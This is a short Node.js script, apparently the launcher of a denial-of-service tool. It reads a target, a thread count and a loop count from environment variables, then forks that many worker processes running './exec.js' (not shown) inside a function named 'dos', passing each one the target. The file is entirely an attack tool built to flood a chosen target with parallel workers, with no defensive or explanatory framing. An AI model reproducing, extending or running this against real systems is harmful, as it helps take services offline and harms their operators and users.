
const {fork} = require("child_process");
require("dotenv").config();
const target = `${process.env.target}`;

const threads = parseInt(process.env.THREAD);
const loops = parseInt(process.env.LOOPS);
async function dos(target,id) {
    let child = fork("./exec.js");
    child.send(JSON.stringify({target:target,loops:loops,id:id}));
    child.on("message",(msg)=>{
        console.log(msg);
    });
}
for (let i=0;i<threads;i++) {
    dos(target,i);
}